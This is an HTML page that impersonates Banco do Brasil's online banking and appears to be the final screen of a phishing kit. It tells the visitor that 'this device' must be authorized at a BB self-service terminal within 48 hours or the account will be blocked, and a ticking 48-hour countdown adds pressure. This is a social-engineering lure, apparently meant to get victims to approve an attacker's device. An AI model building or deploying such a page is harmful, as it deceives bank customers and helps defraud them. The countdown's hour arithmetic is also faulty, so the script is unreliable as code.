<!DOCTYPE html>
<html lang="pt-BR">
<head>
	<title>Banco do Brasil - Autoatendimento Pessoa Física</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">

	<!-- CSS -->
      <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
      <link rel="stylesheet" type="text/css" href="css/estilo.css">
      <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="theme-color" content="#FAF046">
	
	<script src="js/jquery-3.2.1.min.js"></script>
	<script src="js/bootstrap.js"></script>

</head>

<body id="tela4">
	<div class="container">
		<div class="row">
			<div class="col-md-12">
				<center>
				<h1 class="logo-fim">
					<img class="img-responsive" src="img/logo.png" style="width: 30%;">
				</h1>
				<section class="mensagem-sucesso">
					<h2>Aguardando liberação...</h2>
					<center><p style="font-size: 12px;">A autorização deste dispositivo ocorrerá de forma eletrônica em um <b>terminal de auto atendimento</b> BB; Você deverá se dirigir a um Terminal em <b>no máximo 48 horas</b>; A não ativação do seu aparelho acarretará no bloqueio da sua conta podendo ser desbloqueada somente com o Gerente de Relacionamento BB.</p></center>
				</section></center>
				<style>
				body{ 
	font: normal 13px/20px Arial, Helvetica, sans-serif; word-wrap:break-word;
	color: #eee;
	background: #353535;
}
#countdown{
	width: 265px;
	height: 73px;
	text-align: center;
	background: #215297;
	background-image: -webkit-linear-gradient(top, #215297, #215297, #215297, #215297); 
	background-image:    -moz-linear-gradient(top, #215297, #215297, #215297, #215297);
	background-image:     -ms-linear-gradient(top, #215297, #215297, #215297, #215297);
	background-image:      -o-linear-gradient(top, #215297, #215297, #215297, #215297);
	margin: auto;
	padding: 24px 0;
	position: absolute;
  top: 0; bottom: 0; left: 0; right: 0;
}

#countdown #tiles{
	position: relative;
	z-index: 1;
}

#countdown #tiles > span{
	width: 62px;
	max-width: 62px;
	font: bold 28px 'Droid Sans', Arial, sans-serif;
	text-align: center;
	color: #111;
	background-color: #ddd;
	background-image: -webkit-linear-gradient(top, #bbb, #eee); 
	background-image:    -moz-linear-gradient(top, #bbb, #eee);
	background-image:     -ms-linear-gradient(top, #bbb, #eee);
	background-image:      -o-linear-gradient(top, #bbb, #eee);
	border-top: 1px solid #fff;
	border-radius: 3px;
	box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.7);
	margin: 0 7px;
	padding: 18px 0;
	display: inline-block;
	position: relative;
}

#countdown #tiles > span:before{
	content:"";
	width: 0%;
	height: 13px;
	background: #111;
	display: block;
	padding: 0 3px;
	position: absolute;
	top: 41%; left: -3px;
	z-index: -1;
}

#countdown #tiles > span:after{
	content:"";
	width: 100%;
	height: 1px;
	background: #eee;
	border-top: 1px solid #333;
	display: block;
	position: absolute;
	top: 48%; left: 0;
}

#countdown .labels{
	width: 100%;
	height: 25px;
	text-align: center;
	position: absolute;
	bottom: 8px;
}

#countdown .labels li{
	width: 102px;
	font: bold 15px 'Droid Sans', Arial, sans-serif;
	color: #f47321;
	text-shadow: 1px 1px 0px #000;
	text-align: center;
	text-transform: uppercase;
	display: inline-block;
}
				</style>
				<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
				<center>
<div id="countdown">
  <div id='tiles'></div>
  <div class="labels">
  </div>
</div>
</center>
  <p></p>
</div>
<script>
var target_date = new Date().getTime() + (1000*3600*48); // set the countdown date
var days, hours, minutes, seconds; // variables for time units

var countdown = document.getElementById("tiles"); // get tag element

getCountdown();

setInterval(function () { getCountdown(); }, 1000);

function getCountdown(){

	// find the amount of "seconds" between now and target
	var current_date = new Date().getTime();
	var seconds_left = (target_date - current_date) / 1000;

	days = pad( parseInt(seconds_left / 86400) );
	seconds_left = seconds_left % 86400;
		 
	hours = pad( parseInt(seconds_left / 1800) );
	seconds_left = seconds_left % 3600;
		  
	minutes = pad( parseInt(seconds_left / 60) );
	seconds = pad( parseInt( seconds_left % 60 ) );

	// format countdown string + set tag value
	countdown.innerHTML = "<span>" + hours + "</span><span>" + minutes + "</span><span>" + seconds + "</span>"; 
}

function pad(n) {
	return (n < 10 ? '0' : '') + n;
}


  </script>
			</div>
		</div>
	</div>
</body>
</html>